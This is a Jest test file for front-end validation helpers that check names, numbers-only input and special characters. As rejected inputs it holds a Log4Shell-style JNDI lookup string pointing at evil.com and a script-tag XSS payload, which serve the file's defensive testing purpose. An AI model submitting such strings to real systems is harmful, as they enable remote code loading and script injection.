import {
  commonNameChars,
  isNumbersOnly,
  noSpecialChars,
} from "./useValidation";

describe("Common Naming Characters", () => {
  test("It should return false if special characters or numbers present", () => {
    expect(commonNameChars("${jndi:ldap://evil.com}")).toEqual(false);
    expect(commonNameChars("<script>alert('xss')</script>")).toEqual(false);
    expect(commonNameChars("123")).toEqual(false);
    expect(commonNameChars("Tom")).toEqual(true);
    expect(commonNameChars("Robert Downey Jr.")).toEqual(true);
    expect(commonNameChars("Sinéad O'Connor")).toEqual(true); // has char with accent
    expect(commonNameChars("Leah Organa-Vader")).toEqual(true);
    expect(commonNameChars("Tom")).toEqual(true);
  });
});

describe("Number Characters only", () => {
  test("should return false if any char but numeric present", () => {
    expect(isNumbersOnly("abc")).toEqual(false);
    expect(isNumbersOnly("$%&")).toEqual(false);
    expect(isNumbersOnly(" .-?")).toEqual(false);
    expect(isNumbersOnly("53789")).toEqual(true);
  });
});

describe("No Special Characters", () => {
  test("It should return false if special chars present", () => {
    expect(noSpecialChars("$tom")).toEqual(false);
    expect(commonNameChars("${jndi:ldap://evil.com}")).toEqual(false);
    expect(commonNameChars("<script>alert('xss')</script>")).toEqual(false);
    expect(noSpecialChars("123 W. *Main St.")).toEqual(false);
    expect(noSpecialChars("123 W. Main St.")).toEqual(true);
  });
});
